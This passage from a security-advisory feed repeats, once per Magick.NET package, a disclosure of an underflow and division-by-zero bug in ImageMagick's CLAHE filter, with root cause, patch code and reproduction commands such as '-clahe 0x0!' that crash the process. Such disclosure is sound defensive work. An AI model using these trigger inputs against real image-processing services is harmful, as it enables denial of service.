                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-OpenMP-x64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-x64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-x64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
